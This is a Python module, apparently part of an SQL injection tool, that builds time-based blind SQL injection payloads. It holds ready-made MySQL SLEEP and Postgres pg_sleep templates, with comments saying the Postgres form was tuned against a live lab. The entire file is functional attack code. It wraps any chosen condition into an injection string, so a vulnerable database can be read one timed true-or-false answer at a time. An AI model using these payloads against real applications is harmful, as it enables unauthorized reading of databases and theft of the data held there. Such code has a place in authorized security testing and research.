"""Configurable time-based SQL payload builder."""

from dataclasses import dataclass

from .contracts import PayloadBuilder


# Per-dialect (prefix, suffix) presets. Each suffix must accept the
# `{sleep_seconds}` placeholder, same contract as the default MySQL one.
# MSSQL/Oracle are deliberately not here yet: WAITFOR needs a stacked-query
# context and DBMS_LOCK.SLEEP needs a grant that often isn't available --
# both are more fragile and are left for a future phase.
_DIALECT_TEMPLATES: dict[str, tuple[str, str]] = {
    "mysql": ("' AND IF((", "),SLEEP({sleep_seconds}),0)--"),
    # Concatenation (`||`), not `AND`: `pg_sleep()` returns void, which
    # cannot be used as the right-hand side of a boolean AND, and even where
    # Postgres tolerated that, the WHERE clause's own row filter can make it
    # short-circuit before ever evaluating the sleep. Concatenating the
    # CASE..pg_sleep() subquery into the string literal itself forces
    # Postgres to evaluate it (and sleep) before it gets to typecheck the
    # concatenation -- confirmed empirically against a live lab where the
    # `AND` form never triggered a delay on either branch.
    "postgres": (
        "'||(SELECT CASE WHEN (",
        ") THEN pg_sleep({sleep_seconds}) ELSE pg_sleep(0) END)||'",
    ),
}


@dataclass(frozen=True, slots=True)
class TimePayloadBuilder(PayloadBuilder):
    """Build a MySQL-style conditional sleep payload by default.

    The syntax is intentionally configurable because conditional sleep
    expressions differ between database engines and injection contexts.
    """

    sleep_seconds: float
    prefix: str = "' AND IF(("
    suffix: str = "),SLEEP({sleep_seconds}),0)--"

    def __post_init__(self) -> None:
        if self.sleep_seconds <= 0:
            raise ValueError("sleep_seconds must be greater than zero")
        if not self.prefix:
            raise ValueError("prefix cannot be empty")
        if not self.suffix:
            raise ValueError("suffix cannot be empty")
        try:
            self.suffix.format(sleep_seconds=self.sleep_seconds)
        except (KeyError, ValueError) as error:
            raise ValueError("suffix must accept the sleep_seconds placeholder") from error

    @classmethod
    def for_dialect(cls, dialect: str, sleep_seconds: float) -> "TimePayloadBuilder":
        """Build with a known-good (prefix, suffix) preset for ``dialect``."""
        try:
            prefix, suffix = _DIALECT_TEMPLATES[dialect]
        except KeyError:
            raise ValueError(
                f"Unsupported dialect for time-based payloads: {dialect!r}. "
                f"Supported: {', '.join(sorted(_DIALECT_TEMPLATES))}"
            ) from None
        return cls(sleep_seconds=sleep_seconds, prefix=prefix, suffix=suffix)

    def build(self, condition: str) -> str:
        if not condition.strip():
            raise ValueError("condition cannot be empty")
        return f"{self.prefix}{condition}{self.suffix.format(sleep_seconds=self.sleep_seconds)}"
